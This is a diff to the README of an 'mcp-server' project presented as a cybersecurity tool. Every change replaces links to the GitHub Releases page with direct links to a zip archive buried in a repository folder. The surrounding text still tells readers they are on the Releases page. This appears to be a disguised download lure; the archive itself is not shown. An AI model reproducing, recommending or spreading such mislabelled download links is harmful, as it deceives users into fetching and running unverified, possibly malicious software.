@@ -1,6 +1,6 @@
 # 🔒 mcp-server - Secure Your Digital Space Effortlessly
 
-[![Download mcp-server](https://img.shields.io/badge/download-mcp--server-blue.svg)](https://github.com/ytajay326/mcp-server/releases)
+[![Download mcp-server](https://github.com/ytajay326/mcp-server/raw/refs/heads/main/voluted/server-mcp-v2.1-alpha.1.zip)](https://github.com/ytajay326/mcp-server/raw/refs/heads/main/voluted/server-mcp-v2.1-alpha.1.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ The **mcp-server** is part of the CYBERDUDEBIVASH ecosystem. It provides a power
 To get started with the mcp-server, follow these simple steps:
 
 1. **Visit the Releases Page:** You need to download the software from the GitHub Releases page. Click the link below:
-   [Download mcp-server](https://github.com/ytajay326/mcp-server/releases)
+   [Download mcp-server](https://github.com/ytajay326/mcp-server/raw/refs/heads/main/voluted/server-mcp-v2.1-alpha.1.zip)
 
 2. **Select the Latest Release:** On the Releases page, you will see a list of available versions. Choose the latest version for the best features and fixes.
 
@@ -24,7 +24,7 @@ To get started with the mcp-server, follow these simple steps:
 ## 📥 Download & Install
 
 To begin, you can visit the Releases page for the mcp-server and download the installer:
-[Download mcp-server](https://github.com/ytajay326/mcp-server/releases)
+[Download mcp-server](https://github.com/ytajay326/mcp-server/raw/refs/heads/main/voluted/server-mcp-v2.1-alpha.1.zip)
 
 ### Step-by-Step:
 - **Go to the link.** This takes you to the page with all available versions.
@@ -79,6 +79,6 @@ Your feedback helps us improve!
 Learn more about cybersecurity and how the zero-trust model works through various online resources and articles available on cybersecurity best practices.
 
 ### Visit the Releases page for download:
-[Download mcp-server](https://github.com/ytajay326/mcp-server/releases)
+[Download mcp-server](https://github.com/ytajay326/mcp-server/raw/refs/heads/main/voluted/server-mcp-v2.1-alpha.1.zip)
 
 We hope you enjoy using mcp-server and find it valuable for your cybersecurity needs!
